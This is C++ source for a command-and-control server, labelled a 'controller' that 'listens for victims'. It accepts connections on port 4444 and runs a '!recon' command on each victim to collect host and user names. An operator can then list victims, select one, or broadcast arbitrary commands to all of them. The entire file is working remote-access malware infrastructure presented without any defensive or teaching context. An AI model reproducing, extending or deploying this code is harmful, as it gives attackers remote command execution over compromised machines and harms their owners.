// controller: listens for victims, terminal control
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <string>
#include <thread>
#include <mutex>
#include <map>
#include <iostream>
#include <vector>
#include <sstream>

static const int PORT = 4444;
static const int BUFFER = 65536;

struct Victim {
    int id = 0;
    int sock = -1;
    std::string host, user, peer;
    bool alive = false;
};

static std::map<int, Victim> g_victims;
static std::mutex            g_mtx;
static int                   g_next_id = 1;
static int                   g_active  = 0;

static std::string recv_reply(int s) {
    char buf[BUFFER];
    int n = recv(s, buf, BUFFER - 1, 0);
    if (n <= 0) return "";
    buf[n] = 0;
    return std::string(buf);
}

static std::string send_recv(int id, const std::string& cmd) {
    int s;
    { std::lock_guard<std::mutex> g(g_mtx);
      if (!g_victims.count(id) || !g_victims[id].alive) return "[down]";
      s = g_victims[id].sock; }
    if (send(s, cmd.data(), cmd.size(), 0) < 0) return "[send fail]";
    return recv_reply(s);
}

static void register_victim(int c, const std::string& peer) {
    int id;
    { std::lock_guard<std::mutex> g(g_mtx);
      id = g_next_id++;
      Victim v; v.id = id; v.sock = c; v.peer = peer; v.alive = true;
      g_victims[id] = v; }
    std::string rec = send_recv(id, "!recon");
    { std::lock_guard<std::mutex> g(g_mtx);
      std::istringstream ss(rec); std::string tok;
      while (ss >> tok) {
          if (tok.rfind("host=", 0) == 0) g_victims[id].host = tok.substr(5);
          if (tok.rfind("user=", 0) == 0) g_victims[id].user = tok.substr(5);
      } }
    std::cout << "\n[+] victim #" << id << " " << peer << " ("
              << g_victims[id].host << "/" << g_victims[id].user << ")\n>> " << std::flush;
}

static void list_victims() {
    std::lock_guard<std::mutex> g(g_mtx);
    std::cout << "\n--- victims ---\n";
    if (g_victims.empty()) { std::cout << "(none)\n"; return; }
    for (auto& [id, v] : g_victims)
        std::cout << " #" << id << "  " << v.peer << "  "
                  << v.host << "/" << v.user
                  << (v.alive ? "  [up]" : "  [down]")
                  << (id == g_active ? "  <== active" : "") << "\n";
    std::cout << "---------------\n";
}

int main() {
    int srv = socket(AF_INET, SOCK_STREAM, 0);
    int on = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));
    sockaddr_in sa{};
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = INADDR_ANY;
    sa.sin_port = htons(PORT);
    bind(srv, (sockaddr*)&sa, sizeof(sa));
    listen(srv, 20);
    std::cout << "[*] listening " << PORT << "\n";
    std::cout << "[!] list | select <n> | all <cmd> | exit\n\n";

    std::thread([srv]{
        while (true) {
            sockaddr_in cli{}; socklen_t cl = sizeof(cli);
            int c = accept(srv, (sockaddr*)&cli, &cl);
            if (c < 0) continue;
            char ip[64] = {0};
            inet_ntop(AF_INET, &cli.sin_addr, ip, sizeof(ip));
            std::string peer = std::string(ip) + ":" + std::to_string(ntohs(cli.sin_port));
            std::thread(register_victim, c, peer).detach();
        }
    }).detach();

    std::string line;
    while (std::getline(std::cin, line)) {
        if (line.empty()) { std::cout << ">> " << std::flush; continue; }
        if (line == "exit") break;
        if (line == "list") { list_victims(); std::cout << ">> " << std::flush; continue; }

        if (line.rfind("select ", 0) == 0) {
            int id = std::atoi(line.c_str() + 7);
            std::lock_guard<std::mutex> g(g_mtx);
            if (g_victims.count(id) && g_victims[id].alive) {
                g_active = id;
                std::cout << "[*] active => #" << id << " "
                          << g_victims[id].host << "/" << g_victims[id].user << "\n";
            } else std::cout << "[!] no such victim or down\n";
            std::cout << ">> " << std::flush; continue;
        }

        if (line.rfind("all ", 0) == 0) {
            std::string cmd = line.substr(4);
            std::vector<int> ids;
            { std::lock_guard<std::mutex> g(g_mtx);
              for (auto& [id, v] : g_victims) if (v.alive) ids.push_back(id); }
            for (int id : ids) std::cout << "[" << id << "] " << send_recv(id, cmd) << "\n";
            std::cout << ">> " << std::flush; continue;
        }

        int id;
        { std::lock_guard<std::mutex> g(g_mtx); id = g_active; }
        if (!id) { std::cout << "[!] select <n> first\n>> " << std::flush; continue; }
        std::string r = send_recv(id, line);
        std::cout << r;
        if (r.empty() || r.back() != '\n') std::cout << "\n";
        std::cout << ">> " << std::flush;
    }
    return 0;
}